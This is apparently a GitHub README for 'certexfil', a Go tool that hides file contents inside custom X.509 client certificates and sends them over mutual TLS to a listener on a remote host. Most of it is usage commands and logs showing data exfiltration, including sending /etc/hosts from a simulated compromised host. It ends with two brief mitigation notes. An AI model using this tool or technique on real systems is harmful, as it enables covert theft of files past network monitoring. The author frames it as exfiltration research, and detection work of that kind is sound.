# Exfiltration fun using X509 digital certificates

## Overview

I spend a ton of time on exfiltration topics and mitigation techniques. This is my very first attempt to try to learn Go by having a quick way to convert a payload (reading a file) and building it as part as a custom x509 digital certificate.

If you new to playing with certs, you will find the following interesting links that inspired me (must read first):

* https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401
* https://venilnoronha.io/a-step-by-step-guide-to-mtls-in-go
* https://tools.ietf.org/html/draft-ietf-oauth-mtls-14

Certexfil has three modes: CA generation, client and listener:

* You can use --ca to bootstrap and set a CA to create certificates (and authenticate them later)
* You can use --payload embed a payload (file) into a new client certificate then use mTLS against a listener service
* You can use --listen to start aservice using a certificate to accept valid mTLS clients and retrieve the embedded payload

## Usage

### Create CA + prepare your listener on your remote server

This is to create server_cert.pem and server_key.pem certificates to be used for mTLS (client and listener will use those:

```
somewhere$ certexfil -ca -ecdsa-curve P521 --host remote.host.com
```

Now make sure your have binary certexfil and the new ./CERTS directory on your remote server. Then, run the mTLS listener:

```
remoteserver$ ./certexfil --listen
```

### Client or (simulated) compromised host

Passing an output as payload:

```
06:46:00 jma@wintermute Go-Workspace → echo 'w00t w00t' | certexfil --host remote.server.com  --payload -
2019/05/31 18:48:27 [*] Reading from stdin..
2019/05/31 18:48:27 [D] Payload (raw)  --> w00t w00t...	(9 bytes)
2019/05/31 18:48:27 [D] Payload (Prepare()) --> �...		(31 bytes)
2019/05/31 18:48:27 [*] Generated custom cert with payload
Oo
```

Passing a file as payload:
```
06:52:14 jma@wintermute Go-Workspace → certexfil --host remote.server.com --payload /etc/hosts
2019/05/31 18:52:23 [*] Reading from file..
2019/05/31 18:52:24 [D] Payload (raw)  --> 127.0.0.1	...(225 bytes)
2019/05/31 18:52:24 [D] Payload (Prepare()) --> �...		(173 bytes)
2019/05/31 18:52:24 [*] Generated custom cert with payload
Oo

```


### As seen on the listener

```
○ → ./certexfil --listen
2019/05/31 22:51:01 [*] Starting listener..
2019/05/31 22:51:7 [*] Payload received: H4sIAAAAAAAC/yo3MChRABGAAAAA//8t0rpUCQAAAA==
2019/05/31 22:51:07 [*] Payload decoded: w00t w00t

2019/05/31 22:52:24 [*] Payload received: H4sIAAAAAAAC/0TNMa7DIAwG4DmcwtKbH4IMqcQNunXoBQgxDaoDCJOmx69o08abP1v/r/uTVFJJ3VFylubEVXxMS91tIVYsy1pRiD+4zgg+EaUtxBtQiMhgC8KEHIodqV0LnC+PAZzNb2h5LIzR0Cbk4f9Xs28pj9bdhUeljFHHS8QqvD9wcZZrLujDs3nfMptbopgm5B37L5a0ViwsXgEAAP//pJPCNuEAAAA=
2019/05/31 22:52:24 [*] Payload decoded: 127.0.0.1	localhost
127.0.1.1	wintermute

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Mitigations

* Fresh certificates ? you should look for those
* Large payload vs average certificates from same client (a decent firewall or BroIDS should be able to help)

## Todo

* Peer-review from a real Go developper.. I should stick to Python, I know.
* ~~Set a DEBUG option, clean code~~
* ~~merge client/listener in one~~
* automatic deployment of generated certs (DNS TXT? :P)
* Actually have crypto in cryptopayload module

## Contact

* @Sourcefrenchy
